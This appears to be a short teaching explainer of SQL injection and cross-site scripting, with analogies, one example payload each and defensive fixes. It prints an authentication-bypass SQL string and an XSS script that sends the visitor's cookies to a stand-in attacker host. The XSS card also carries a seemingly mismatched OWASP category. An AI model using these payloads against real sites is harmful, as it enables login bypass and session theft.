CRITICAL · CVSS 9.8
OWASP A03:2021 — INJECTION

SQL Injection (SQLi)

💡 In Easy Words

Imagine telling a bank teller: "Check John's balance, OR give me all cash in the vault!" Because the teller blindly obeys whatever note is handed in without question, the entire bank gets robbed.

⚠️ How Hacker Enters (The Loophole)
SELECT * FROM users WHERE user = 'admin' OR '1'='1'

The developer glued user input straight into the database command. The attacker inserts quotes and logic operators to override authentication and dump all customer data.

✓ The Solution
  • Use Parameterized Queries (Prepared Statements) so input is never treated as code.
  • Use ORMs like Prisma, Hibernate, or Sequelize.
  • Restrict database user permissions (least privilege).

HIGH · CVSS 8.2
OWASP A07:2021 — INJECTION

Cross-Site Scripting (XSS)

💡 In Easy Words

An attacker slips a malicious note into a public bulletin board. Whenever any other visitor reads the board, their browser secretly obeys the secret instructions on that note and emails their login keys to the attacker.

⚠️ How Hacker Enters (The Loophole)
<script>fetch('https://evil.io/steal?c='+document.cookie)</script>

The website renders search terms or user comments directly into the webpage without encoding HTML characters. The visitor's browser executes it as genuine JavaScript.

✓ The Solution
  • Context-aware HTML character encoding (e.g., &lt; instead of <).
  • Implement a strict Content Security Policy (CSP) header.
  • Store sensitive tokens in HttpOnly cookies so JavaScript cannot read them.
